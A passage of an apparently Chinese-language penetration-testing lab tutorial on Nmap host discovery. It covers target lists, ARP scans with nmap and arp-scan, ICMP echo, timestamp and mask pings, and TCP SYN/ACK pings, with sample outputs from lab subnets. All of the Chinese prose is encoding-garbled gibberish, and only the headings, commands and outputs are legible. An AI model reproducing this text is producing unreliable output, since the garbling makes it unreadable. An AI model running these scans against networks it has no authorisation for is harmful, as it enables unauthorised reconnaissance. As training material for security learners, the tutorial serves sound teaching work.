åªèƒ½å‘ç°è¯¥å­ç½‘ï¼ˆ10.1.100.0/24ï¼‰ä¸­çš„è®¾å¤‡ã€‚å‡è®¾ä½ å·²è¿æ¥åˆ°ä¸ç›®æ ‡ç³»ç»Ÿå­ç½‘ä¸åŒçš„å­ç½‘ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæ‰«æä»ªç”Ÿæˆçš„æ‰€æœ‰æ•°æ®åŒ…å°†é€šè¿‡é»˜è®¤ç½‘å…³ï¼ˆè·¯ç”±å™¨ï¼‰è¿›è¡Œè·¯ç”±ï¼Œä»¥åˆ°è¾¾å¦ä¸€ä¸ªå­ç½‘ä¸Šçš„ç³»ç»Ÿã€‚ä½†æ˜¯ï¼ŒARPæŸ¥è¯¢ä¸ä¼šè¢«è·¯ç”±ï¼Œå› æ­¤æ— æ³•è¶Šè¿‡å­ç½‘è·¯ç”±å™¨ã€‚ARP
æ˜¯ä¸€ä¸ªé“¾è·¯å±‚åè®®ï¼ŒARP æ•°æ®åŒ…è¢«ç»‘å®šåˆ°å…¶å¯¹åº”çš„å­ç½‘ã€‚</p>
<h2 id="enumerating-targetsæšä¸¾ç›®æ ‡">Enumerating
Targetsï¼ˆæšä¸¾ç›®æ ‡ï¼‰</h2>
<p>åœ¨æ‰«æä¹‹å‰ï¼Œæˆ‘ä»¬éœ€è¦æŒ‡å®šç›®æ ‡ï¼Œä¸€èˆ¬è€Œè¨€ï¼Œç›®æ ‡å¯ä»¥æ˜¯ï¼šåˆ—è¡¨ã€èŒƒå›´æˆ–æ˜¯ä¸€ä¸ªå­ç½‘ï¼Œç¤ºä¾‹å¦‚ä¸‹ï¼š</p>
<ul>
<li>listï¼š<code>MACHINE_IP scanme.nmap.org example.com</code> å°†æ‰«æ 3
ä¸ªIPåœ°å€ã€‚</li>
<li>rangeï¼š<code>10.11.12.15-20</code>å°†æ‰«æ 6
ä¸ªIPåœ°å€ï¼š<code>10.11.12.15</code>ã€<code>10.11.12.16</code> Â·Â·Â·Â·Â·Â·
ä»¥åŠ<code>10.11.12.20</code>ã€‚</li>
<li>subnetï¼š<code>MACHINE_IP/30</code>å°†æ‰«æ 4
ä¸ªIPåœ°å€ã€‚ï¼ˆè½¬æ¢ä¸ºäºŒè¿›åˆ¶æ¥çœ‹ï¼Œå­ç½‘éƒ¨åˆ†æœ‰ 30 ä½ï¼Œä¸»æœºéƒ¨åˆ†æœ‰ 2
ä½ï¼›å› æ­¤å…±æœ‰ 2<sup>2</sup>=4 ä¸ªä¸»æœºå³ IP åœ°å€ï¼‰</li>
</ul>
<p>è¿˜å¯ä»¥æä¾›ä¸€ä¸ªæ–‡ä»¶ä½œä¸ºç›®æ ‡åˆ—è¡¨çš„è¾“å…¥ï¼š<code>nmap -iL list_of_hosts.txt</code></p>
<p>å¦‚æœè¦æ£€æŸ¥ Nmap
å°†æ‰«æçš„ä¸»æœºåˆ—è¡¨ï¼Œåˆ™å¯ä»¥ä½¿ç”¨<code>nmap -sL TARGETS</code>ã€‚æ­¤é€‰é¡¹å°†ä¸ºä½ æä¾›
Nmap å°†è¦æ‰«æè€Œæ— éœ€æ‰«æçš„ä¸»æœºçš„è¯¦ç»†åˆ—è¡¨ï¼›ä½†æ˜¯ï¼ŒNmap
å°†å°è¯•å¯¹æ‰€æœ‰ç›®æ ‡è¿›è¡Œåå‘ DNS
è§£æï¼Œä»¥è·å–å…¶åŸŸåã€‚åŸŸåå¯èƒ½ä¼šå‘æ¸—é€æµ‹è¯•è€…é€éœ²å„ç§ä¿¡æ¯ã€‚ï¼ˆå¦‚æœä½ ä¸å¸Œæœ›
Nmap è¿æ¥åˆ°DNSæœåŠ¡å™¨ï¼Œåˆ™å¯ä»¥æ·»åŠ <code>-n</code>ã€‚ï¼‰</p>
<h2 id="discovering-live-hosts">Discovering Live Hosts</h2>
<p>è®©æˆ‘ä»¬å›é¡¾ä¸‹å›¾æ‰€ç¤ºçš„ TCP/IP å±‚ï¼Œåˆ©ç”¨åè®®æ¥å‘ç°æ´»åŠ¨ä¸»æœºï¼š</p>
<ul>
<li>ARPï¼ˆé“¾è·¯å±‚ï¼‰ï¼šå‘ç½‘æ®µä¸Šçš„å¹¿æ’­åœ°å€å‘é€ä¸€ä¸ªå¸§ï¼Œå¹¶è¦æ±‚å…·æœ‰ç‰¹å®š IP
åœ°å€çš„è®¡ç®—æœºé€šè¿‡æä¾›å…¶MACï¼ˆç¡¬ä»¶ï¼‰åœ°å€è¿›è¡Œå“åº”ã€‚</li>
<li>ICMPï¼ˆç½‘ç»œå±‚ï¼‰ï¼šICMPæœ‰<a target="_blank" rel="noopener" href="https://www.iana.org/assignments/icmp-parameters/icmp-parameters.xhtml">å¤šç§ç±»å‹</a>ã€‚ICMP
pingä½¿ç”¨ç±»å‹ 8ï¼ˆEchoï¼‰å’Œç±»å‹ 0ï¼ˆEcho Replyï¼‰ã€‚å¦‚æœä½ æƒ³ ping
åŒä¸€å­ç½‘ä¸Šçš„ç³»ç»Ÿï¼ŒARP æŸ¥è¯¢åº”è¯¥åœ¨ ICMP Echoä¹‹å‰ä½¿ç”¨ã€‚</li>
<li>TCPï¼ˆä¼ è¾“å±‚ï¼‰ï¼šæ‰«æä»ªå¯ä»¥å‘é€šç”¨TCPæˆ–UDPç«¯å£å‘é€ä¸€ä¸ªç‰¹åˆ¶çš„æ•°æ®åŒ…ï¼Œä»¥æ£€æŸ¥ç›®æ ‡æ˜¯å¦ä¼šå“åº”ã€‚æ­¤æ–¹æ³•éå¸¸æœ‰æ•ˆï¼Œå°¤å…¶æ˜¯å½“
ICMP Echo è¢«é˜»æ­¢æ—¶ã€‚</li>
<li>UDPï¼ˆä¼ è¾“å±‚ï¼‰ï¼šåŒä¸Šã€‚</li>
</ul>
<figure>
<img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/745e0412b319d324352c7b29863b74f4.png" alt="img">
<figcaption aria-hidden="true">img</figcaption>
</figure>
<h2 id="nmap-host-discovery-using-arp">Nmap Host Discovery Using
ARP</h2>
<p>Nmap éµå¾ªä»¥ä¸‹æ–¹æ³•æ¥å‘ç°æ´»åŠ¨ä¸»æœºï¼š</p>
<ol type="1">
<li>å½“ç‰¹æƒç”¨æˆ·è¯•å›¾æ‰«ææœ¬åœ°ç½‘ç»œï¼ˆä»¥å¤ªç½‘ï¼‰ä¸Šçš„ç›®æ ‡æ—¶ï¼ŒNmapä½¿ç”¨ARPè¯·æ±‚ã€‚ç‰¹æƒç”¨æˆ·æ˜¯<code>root</code>ç”¨æˆ·æˆ–å±äº<code>sudoers</code>å¹¶å¯ä»¥è¿è¡Œ<code>sudo</code>çš„ç”¨æˆ·ã€‚</li>
<li>å½“ç‰¹æƒç”¨æˆ·å°è¯•æ‰«ææœ¬åœ°ç½‘ç»œå¤–çš„ç›®æ ‡æ—¶ï¼ŒNmap ä½¿ç”¨ ICMP
å›æ˜¾è¯·æ±‚ã€ç«¯å£80çš„TCP ACKï¼ˆç¡®è®¤ï¼‰ã€ç«¯å£443çš„ TCP SYNï¼ˆåŒæ­¥ï¼‰å’Œ ICMP
æ—¶é—´æˆ³è¯·æ±‚ã€‚</li>
<li>å½“éç‰¹æƒç”¨æˆ·è¯•å›¾æ‰«ææœ¬åœ°ç½‘ç»œä¹‹å¤–çš„ç›®æ ‡æ—¶ï¼ŒNmap é‡‡ç”¨ TCP
ä¸‰æ¬¡æ¡æ‰‹æ–¹å¼ï¼Œå°† SYN æ•°æ®åŒ…å‘é€åˆ° 80 å’Œ 443 ç«¯å£ã€‚</li>
</ol>
<p>é»˜è®¤æƒ…å†µä¸‹ï¼ŒNmap ä½¿ç”¨ ping
æ‰«ææ¥æŸ¥æ‰¾æ´»åŠ¨ä¸»æœºï¼Œå¹¶ä¸”åªæ‰«ææ´»åŠ¨ä¸»æœºã€‚å¦‚æœå¸Œæœ›ä½¿ç”¨ Nmap
åœ¨ä¸æ‰«æç³»ç»Ÿç«¯å£çš„æƒ…å†µä¸‹å‘ç°åœ¨çº¿ä¸»æœºï¼Œå¯ä»¥ä½¿ç”¨<code>nmap -sn TARGETS</code>ã€‚</p>
<p>åªæœ‰å½“ä½ å’Œç›®æ ‡ç³»ç»Ÿåœ¨åŒä¸€å­ç½‘ä¸­æ—¶ï¼ŒARP
æ‰«ææ‰å¯èƒ½ä½¿ç”¨ã€‚åœ¨ä»¥å¤ªç½‘ï¼ˆ802.3ï¼‰å’Œ
WiFiï¼ˆ802.11ï¼‰ä¸Šï¼Œä½ éœ€è¦çŸ¥é“ç›®æ ‡ç³»ç»Ÿçš„ MAC
åœ°å€æ‰èƒ½å¤Ÿä¸ä¹‹é€šä¿¡ã€‚MACåœ°å€æ˜¯é“¾è·¯å±‚æŠ¥å¤´æ‰€å¿…éœ€çš„ï¼›æŠ¥å¤´åŒ…å«æº MAC
åœ°å€å’Œç›®æ ‡ MAC åœ°å€ä»¥åŠå…¶ä»–å­—æ®µã€‚ä¸ºäº†è·å¾— MAC åœ°å€ï¼Œæ“ä½œç³»ç»Ÿä¼šå‘é€ ARP
æŸ¥è¯¢ã€‚ARP æŸ¥è¯¢ä»…åœ¨ç›®æ ‡ä¸ä½ æ‰€åœ¨çš„å­ç½‘ç›¸åŒæ—¶æœ‰æ•ˆï¼Œå³åœ¨ç›¸åŒçš„ä»¥å¤ªç½‘æˆ– WiFi
ä¸Šã€‚åœ¨å¯¹æœ¬åœ°ç½‘ç»œè¿›è¡Œ Nmap æ‰«ææœŸé—´ï¼Œåº”è¯¥ä¼šçœ‹åˆ°è®¸å¤š ARP æŸ¥è¯¢ã€‚å¦‚æœæ‚¨å¸Œæœ›
Nmap åªæ‰§è¡Œ ARP
æ‰«æè€Œä¸æ‰«æç«¯å£ï¼Œé‚£ä¹ˆå¯ä»¥ä½¿ç”¨<code>Nmap -PR -sn TARGETS</code>ï¼Œå…¶ä¸­<code>-PR</code>è¡¨ç¤ºä½ åªéœ€è¦è¿›è¡Œ
ARP æ‰«æã€‚ä¸‹é¢çš„ç¤ºä¾‹æ˜¾ç¤ºäº† Nmap ä½¿ç”¨ ARP
è¿›è¡Œä¸»æœºæŸ¥æ‰¾è€Œä¸è¿›è¡Œç«¯å£æ‰«æã€‚è¿è¡Œ<code>nmap -PR -sn MACHINE_IP/24</code>æ¥å‘ç°ä¸ç›®æ ‡æœºå™¨åœ¨åŒä¸€å­ç½‘ä¸Šçš„æ‰€æœ‰ç³»ç»Ÿã€‚</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">pentester@TryHackMe$ sudo nmap -PR -sn 10.10.210.6/24</span><br><span class="line"></span><br><span class="line">Starting Nmap 7.60 ( https://nmap.org ) at 2021-09-02 07:12 BST</span><br><span class="line">Nmap scan report for ip-10-10-210-75.eu-west-1.compute.internal (10.10.210.75)</span><br><span class="line">Host is up (0.00013s latency).</span><br><span class="line">MAC Address: 02:83:75:3A:F2:89 (Unknown)</span><br><span class="line">Nmap scan report for ip-10-10-210-100.eu-west-1.compute.internal (10.10.210.100)</span><br><span class="line">Host is up (-0.100s latency).</span><br><span class="line">MAC Address: 02:63:D0:1B:2D:CD (Unknown)</span><br><span class="line">Nmap scan report for ip-10-10-210-165.eu-west-1.compute.internal (10.10.210.165)</span><br><span class="line">Host is up (0.00025s latency).</span><br><span class="line">MAC Address: 02:59:79:4F:17:B7 (Unknown)</span><br><span class="line">Nmap scan report for ip-10-10-210-6.eu-west-1.compute.internal (10.10.210.6)</span><br><span class="line">Host is up.</span><br><span class="line">Nmap done: 256 IP addresses (4 hosts up) scanned in 3.12 seconds</span><br></pre></td></tr></tbody></table></figure>
<p>åœ¨æœ¬ä¾‹ä¸­ï¼ŒAtackBox çš„ IP åœ°å€æ˜¯10.10.210.6ï¼Œå®ƒä½¿ç”¨ ARP
è¯·æ±‚æ¥å‘ç°åŒä¸€å­ç½‘ä¸Šçš„æ´»åŠ¨ä¸»æœºã€‚</p>
<figure>
<img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/f0ce4cd34b827f529255c5c73bb909d1.png" alt="img">
<figcaption aria-hidden="true">img</figcaption>
</figure>
<p>è¯´åˆ° ARP æ‰«æï¼Œæˆ‘ä»¬åº”è¯¥æåˆ°ä¸€ä¸ªå›´ç»• ARP
æŸ¥è¯¢æ„å»ºçš„æ‰«æå™¨ï¼š<code>arp-scan</code>ï¼›å®ƒæä¾›äº†è®¸å¤šè‡ªå®šä¹‰æ‰«æçš„é€‰é¡¹ã€‚æœ‰å…³è¯¦ç»†ä¿¡æ¯ï¼Œè¯·è®¿é—®
<a target="_blank" rel="noopener" href="http://www.royhills.co.uk/wiki/index.php/Main_Page">arp-scanner
wiki</a>ã€‚ä¸€ä¸ªå¸¸è§çš„é€‰æ‹©æ˜¯ <code>arp-scan --localnet</code> æˆ–è€…ç®€å•çš„
<code>arp-scan -l</code>ã€‚è¿™ä¸ªå‘½ä»¤å°†å‘é€ ARP æŸ¥è¯¢åˆ°æœ¬åœ°ç½‘ç»œä¸Šæ‰€æœ‰æœ‰æ•ˆçš„
IP
åœ°å€ã€‚æ­¤å¤–ï¼Œå¦‚æœä½ çš„ç³»ç»Ÿæœ‰å¤šä¸ªæ¥å£ï¼Œå¹¶ä¸”ä½ æœ‰å…´è¶£å‘ç°å…¶ä¸­ä¸€ä¸ªä¸Šçš„æ´»åŠ¨ä¸»æœºï¼Œä½ å¯ä»¥ä½¿ç”¨<code>-I</code>
æŒ‡å®šå…·ä½“æ¥å£ï¼Œä¾‹å¦‚ï¼Œ<code>sudo arp-scan -I eth0 -l</code>
å°†å‘<code>eth0</code>æ¥å£ä¸Šçš„æ‰€æœ‰æœ‰æ•ˆIPåœ°å€å‘é€ ARP æŸ¥è¯¢ã€‚</p>
<p>åœ¨ä¸‹é¢çš„ç¤ºä¾‹ä¸­ï¼Œæˆ‘ä»¬ä½¿ç”¨<code>arp-scan ATTACKBOX_IP/24</code>æ‰«æäº†
AtackBox çš„å­ç½‘ã€‚</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">pentester@TryHackMe$ sudo arp-scan 10.10.210.6/24</span><br><span class="line">Interface: eth0, datalink type: EN10MB (Ethernet)</span><br><span class="line">WARNING: host part of 10.10.210.6/24 is non-zero</span><br><span class="line">Starting arp-scan 1.9 with 256 hosts (http://www.nta-monitor.com/tools/arp-scan/)</span><br><span class="line">10.10.210.75	02:83:75:3a:f2:89	(Unknown)</span><br><span class="line">10.10.210.100	02:63:d0:1b:2d:cd	(Unknown)</span><br><span class="line">10.10.210.165	02:59:79:4f:17:b7	(Unknown)</span><br><span class="line"></span><br><span class="line">4 packets received by filter, 0 packets dropped by kernel</span><br><span class="line">Ending arp-scan 1.9: 256 hosts scanned in 2.726 seconds (93.91 hosts/sec). 3 responded</span><br></pre></td></tr></tbody></table></figure>
<h2 id="nmap-host-discovery-using-icmp">Nmap Host Discovery Using
ICMP</h2>
<p>æˆ‘ä»¬å¯ä»¥ ping ç›®æ ‡ç½‘ç»œä¸Šçš„æ¯ä¸ª IP åœ°å€ï¼Œçœ‹çœ‹è°ç”¨ ping reply (ICMP
Type 0) æ¥å“åº”æˆ‘ä»¬çš„<code>ping</code> (ICMP Type 8/Echo)
è¯·æ±‚ã€‚å°½ç®¡è¿™å°†æ˜¯æœ€ç›´æ¥çš„æ–¹æ³•ï¼Œä½†å®ƒå¹¶ä¸æ€»æ˜¯å¯é çš„ã€‚è®¸å¤šé˜²ç«å¢™ä¼šé˜»æ­¢ ICMP
echo ï¼›Windows é…ç½®äº†ä¸€ä¸ªä¸»æœºé˜²ç«å¢™ï¼Œé»˜è®¤æƒ…å†µä¸‹é˜»æ­¢ ICMP echo
è¯·æ±‚ã€‚è¯·è®°ä½ï¼Œå¦‚æœç›®æ ‡ä½äºç›¸åŒçš„å­ç½‘ä¸Šï¼Œåˆ™ ARP æŸ¥è¯¢å°†å…ˆäº ICMP
è¯·æ±‚ã€‚</p>
<h3 id="pe">-PE</h3>
<p>è‹¥è¦ä½¿ç”¨ ICMP echo request æ¥å‘ç°æ´»åŠ¨ä¸»æœºï¼Œè¯·æ·»åŠ é€‰é¡¹
<code>-PE</code>ã€‚(è®°ä½ï¼Œå¦‚æœä½ ä¸æƒ³è¿›è¡Œç«¯å£æ‰«æï¼Œè¯·æ·»åŠ 
<code>-sn</code>ã€‚)å¦‚ä¸‹å›¾æ‰€ç¤ºï¼ŒICMP echo æ‰«æé€šè¿‡å‘é€ ICMP echo request
æ¥å·¥ä½œï¼Œå¹¶æœŸæœ›ç›®æ ‡ä½¿ç”¨ ICMP echo reply è¿›è¡Œåº”ç­”ã€‚</p>
<figure>
<img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/25fb5fd5d2009cf69d7aae40e8fde2ec.png" alt="img">
<figcaption aria-hidden="true">img</figcaption>
</figure>
<p>åœ¨ä¸‹é¢çš„ç¤ºä¾‹ä¸­ï¼Œæˆ‘ä»¬ä½¿ç”¨<code>nmap -PE -sn MACHINE_IP/24</code>æ‰«æäº†ç›®æ ‡æ‰€åœ¨çš„å­ç½‘ã€‚æ­¤æ‰«æå°†å‘å­ç½‘ä¸Šçš„æ¯ä¸ª
IP åœ°å€å‘é€ ICMP echo
æ•°æ®åŒ…ã€‚ä¸‹é¢çš„è¾“å‡ºæ˜¾ç¤ºäº†ä½¿ç”¨<code>sudo nmap -PE -sn MACHINE_IP/24</code>æ‰«æè™šæ‹Ÿæœºçš„
C ç±»å­ç½‘çš„ç»“æœã€‚</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">pentester@TryHackMe$ sudo nmap -PE -sn 10.10.68.220/24</span><br><span class="line"></span><br><span class="line">Starting Nmap 7.60 ( https://nmap.org ) at 2021-09-02 10:16 BST</span><br><span class="line">Nmap scan report for ip-10-10-68-50.eu-west-1.compute.internal (10.10.68.50)</span><br><span class="line">Host is up (0.00017s latency).</span><br><span class="line">MAC Address: 02:95:36:71:5B:87 (Unknown)</span><br><span class="line">Nmap scan report for ip-10-10-68-52.eu-west-1.compute.internal (10.10.68.52)</span><br><span class="line">Host is up (0.00017s latency).</span><br><span class="line">MAC Address: 02:48:E8:BF:78:E7 (Unknown)</span><br><span class="line">Nmap scan report for ip-10-10-68-77.eu-west-1.compute.internal (10.10.68.77)</span><br><span class="line">Host is up (-0.100s latency).</span><br><span class="line">MAC Address: 02:0F:0A:1D:76:35 (Unknown)</span><br><span class="line">Nmap scan report for ip-10-10-68-110.eu-west-1.compute.internal (10.10.68.110)</span><br><span class="line">Host is up (-0.10s latency).</span><br><span class="line">MAC Address: 02:6B:50:E9:C2:91 (Unknown)</span><br><span class="line">Nmap scan report for ip-10-10-68-140.eu-west-1.compute.internal (10.10.68.140)</span><br><span class="line">Host is up (0.00021s latency).</span><br><span class="line">MAC Address: 02:58:59:63:0B:6B (Unknown)</span><br><span class="line">Nmap scan report for ip-10-10-68-142.eu-west-1.compute.internal (10.10.68.142)</span><br><span class="line">Host is up (0.00016s latency).</span><br><span class="line">MAC Address: 02:C6:41:51:0A:0F (Unknown)</span><br><span class="line">Nmap scan report for ip-10-10-68-220.eu-west-1.compute.internal (10.10.68.220)</span><br><span class="line">Host is up (0.00026s latency).</span><br><span class="line">MAC Address: 02:25:3F:DB:EE:0B (Unknown)</span><br><span class="line">Nmap scan report for ip-10-10-68-222.eu-west-1.compute.internal (10.10.68.222)</span><br><span class="line">Host is up (0.00025s latency).</span><br><span class="line">MAC Address: 02:28:B1:2E:B0:1B (Unknown)</span><br><span class="line">Nmap done: 256 IP addresses (8 hosts up) scanned in 2.11 seconds</span><br></pre></td></tr></tbody></table></figure>
<p>æ‰«æè¾“å‡ºæ˜¾ç¤ºå…«å°ä¸»æœºå·²å¯åŠ¨ï¼›æ­¤å¤–ï¼Œè¿˜æ˜¾ç¤ºäº†å®ƒä»¬çš„MACåœ°å€ã€‚ä¸€èˆ¬æ¥è¯´ï¼Œé™¤éç›®æ ‡ä¸æˆ‘ä»¬çš„ç³»ç»Ÿä½äºåŒä¸€å­ç½‘ï¼Œå¦åˆ™æˆ‘ä»¬æ²¡å¿…è¦äº†è§£ç›®æ ‡çš„
MAC åœ°å€ã€‚ä¸Šé¢çš„è¾“å‡ºè¡¨æ˜ï¼ŒNmapä¸éœ€è¦å‘é€ ICMP æ•°æ®åŒ…ï¼Œå› ä¸ºå®ƒæ ¹æ®æ”¶åˆ°çš„
ARP å“åº”ç¡®è®¤è¿™äº›ä¸»æœºå·²å¯åŠ¨ã€‚</p>
<p>æˆ‘ä»¬å°†é‡å¤ä¸Šé¢çš„æ‰«æ;
ç„¶è€Œï¼Œè¿™ä¸€æ¬¡ï¼Œæˆ‘ä»¬å°†ä»å±äºå…¶ä»–å­ç½‘çš„ç³»ç»Ÿè¿›è¡Œæ‰«æã€‚ç»“æœæ˜¯ç›¸ä¼¼çš„ï¼Œä½†æ²¡æœ‰
MAC åœ°å€ã€‚</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">pentester@TryHackMe$ sudo nmap -PE -sn 10.10.68.220/24</span><br><span class="line"></span><br><span class="line">Starting Nmap 7.92 ( https://nmap.org ) at 2021-09-02 12:16 EEST</span><br><span class="line">Nmap scan report for 10.10.68.50</span><br><span class="line">Host is up (0.12s latency).</span><br><span class="line">Nmap scan report for 10.10.68.52</span><br><span class="line">Host is up (0.12s latency).</span><br><span class="line">Nmap scan report for 10.10.68.77</span><br><span class="line">Host is up (0.11s latency).</span><br><span class="line">Nmap scan report for 10.10.68.110</span><br><span class="line">Host is up (0.11s latency).</span><br><span class="line">Nmap scan report for 10.10.68.140</span><br><span class="line">Host is up (0.11s latency).</span><br><span class="line">Nmap scan report for 10.10.68.142</span><br><span class="line">Host is up (0.11s latency).</span><br><span class="line">Nmap scan report for 10.10.68.220</span><br><span class="line">Host is up (0.11s latency).</span><br><span class="line">Nmap scan report for 10.10.68.222</span><br><span class="line">Host is up (0.11s latency).</span><br><span class="line">Nmap done: 256 IP addresses (8 hosts up) scanned in 8.26 seconds</span><br></pre></td></tr></tbody></table></figure>
<h3 id="pp">-PP</h3>
<p>å› ä¸º ICMP echo è¯·æ±‚å¾€å¾€ä¼šè¢«é˜»å¡ï¼Œæ‰€ä»¥ä½ è¿˜å¯ä»¥è€ƒè™‘ä½¿ç”¨ ICMP æ—¶é—´æˆ³æˆ–
ICMP åœ°å€æ©ç è¯·æ±‚æ¥åˆ¤æ–­ç³»ç»Ÿæ˜¯å¦åœ¨çº¿ã€‚Nmap ä½¿ç”¨æ—¶é—´æˆ³è¯·æ±‚(ICMP Type
13)å¹¶æ£€æŸ¥å®ƒæ˜¯å¦å°†è·å¾—æ—¶é—´æˆ³åº”ç­”(ICMP Type
14)ã€‚æ·»åŠ <code>-PP</code>é€‰é¡¹å‘Šè¯‰ Nmap ä½¿ç”¨ ICMP æ—¶é—´æˆ³è¯·æ±‚ã€‚</p>
<h3 id="pm">-PM</h3>
<p>ç±»ä¼¼åœ°ï¼ŒNmap é€šè¿‡æ·»åŠ <code>-PM</code>é€‰é¡¹æ¥ä½¿ç”¨åœ°å€æ©ç æŸ¥è¯¢ï¼ˆICMP
Type
17ï¼‰ã€‚æ³¨æ„ï¼šè¯¥è¯·æ±‚å¯èƒ½ä¼šè¢«ç›®æ ‡ç³»ç»Ÿæˆ–é˜²ç«å¢™è¿‡æ»¤æ‰ï¼Œè¿™æ—¶ï¼Œæˆ‘ä»¬åº”è¯¥è€ƒè™‘ä½¿ç”¨å¦ä¸€ç§æ–¹æ³•ã€‚</p>
<h2 id="nmap-host-discovery-using-tcp-and-udp">Nmap Host Discovery Using
TCP and UDP</h2>
<h3 id="tcp-syn-ping"><strong>TCP SYN Ping</strong></h3>
<p>æˆ‘ä»¬å¯ä»¥å°†è®¾ç½®äº†SYNï¼ˆåŒæ­¥ï¼‰æ ‡å¿—çš„æ•°æ®åŒ…å‘é€åˆ° TCP ç«¯å£ï¼Œé»˜è®¤æƒ…å†µä¸‹ä¸º
80 ï¼Œå¹¶ç­‰å¾…å“åº”ã€‚å¼€æ”¾ç«¯å£åº”å›å¤ SYN/ACK ï¼ˆç¡®è®¤ï¼‰ï¼›å…³é—­çš„ç«¯å£å°†å¯¼è‡´
RSTï¼ˆé‡ç½®ï¼‰ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬æ£€æŸ¥æ˜¯å¦ä¼šå¾—åˆ°ä»»ä½•å›åº”ï¼Œä»¥æ¨æ–­ä¸»æœºæ˜¯å¦å¯åŠ¨ã€‚ç«¯å£çš„ç‰¹å®šçŠ¶æ€åœ¨è¿™é‡Œå¹¶ä¸é‡è¦ã€‚ä¸‹å›¾æé†’äº†
TCP 3æ¬¡æ¡æ‰‹é€šå¸¸å¦‚ä½•å·¥ä½œã€‚</p>
<figure>
<img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/23e7f481f78de8d3e89ef845b747002d.png" alt="img">
<figcaption aria-hidden="true">img</figcaption>
</figure>
<p>TCP SYN ping
ä½¿ç”¨æ–¹æ³•ï¼š<code>-PS</code>é€‰é¡¹ã€‚<code>-PS</code>åå¯æ·»åŠ ç«¯å£å·ã€èŒƒå›´ã€åˆ—è¡¨æˆ–å®ƒä»¬çš„ç»„åˆï¼Œä¾‹å¦‚ï¼Œ<code>-PS21</code>å°†ä¼šä»¥
21 å·ç«¯å£ä¸ºç›®æ ‡ï¼Œ<code>-PS21-25</code>å°†ä¼šä»¥ç«¯å£ 21 ã€22 ã€23 ã€24 ã€25
ä¸ºç›®æ ‡ã€‚</p>
<h3 id="tcp-ack-ping"><strong>TCP ACK Ping</strong></h3>
<p>é»˜è®¤æƒ…å†µä¸‹ï¼Œä½¿ç”¨ç«¯å£ 80 ã€‚è¯­æ³•ç±»ä¼¼äº TCP SYN ping
ã€‚<code>-PA</code>åé¢åº”è¯¥æ˜¯ç«¯å£å·ã€èŒƒå›´ã€åˆ—è¡¨æˆ–å®ƒä»¬çš„ç»„åˆã€‚ä¾‹å¦‚ï¼Œ<code>-PA21</code>ã€<code>-PA21-25</code>å’Œ<code>-PA80,443,8080</code>ã€‚å¦‚æœæœªæŒ‡å®šç«¯å£ï¼Œå°†ä½¿ç”¨ç«¯å£
80 ã€‚ä½ å¿…é¡»ä½œä¸ºç‰¹æƒç”¨æˆ·è¿è¡Œ Nmap
æ‰èƒ½å®Œæˆæ­¤ä»»åŠ¡ã€‚å¦‚æœä½ ä»¥éç‰¹æƒç”¨æˆ·èº«ä»½å°è¯•ï¼ŒNmap å°†å°è¯•è¿›è¡Œ3æ¬¡æ¡æ‰‹ã€‚</p>
<p>ä¸‹å›¾æ˜¾ç¤ºäº†ä»»ä½•å¸¦æœ‰ ACK æ ‡å¿—çš„ TCP æ•°æ®åŒ…éƒ½åº”è¯¥è¿”å› è®¾ç½®äº† RST æ ‡å¿—çš„
TCP æ•°æ®åŒ…ã€‚ç”±äºå¸¦æœ‰ ACK æ ‡å¿—çš„ TCP æ•°æ®åŒ…ä¸æ˜¯ä»»ä½• æ­£åœ¨è¿›è¡Œçš„è¿æ¥
çš„ä¸€éƒ¨åˆ†ï¼Œå› æ­¤ç›®æ ‡ä½¿ç”¨è®¾ç½®çš„ RST
æ ‡å¿—è¿›è¡Œå“åº”ã€‚é¢„æœŸå“åº”ç”¨äºæ£€æµ‹ç›®æ ‡ä¸»æœºæ˜¯å¦å·²å¯åŠ¨ã€‚</p>
<figure>
<img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/db5ab44a8c700c4ab0603e85e456040d.png" alt="img">
<figcaption aria-hidden="true">img</figcaption>
</figure>
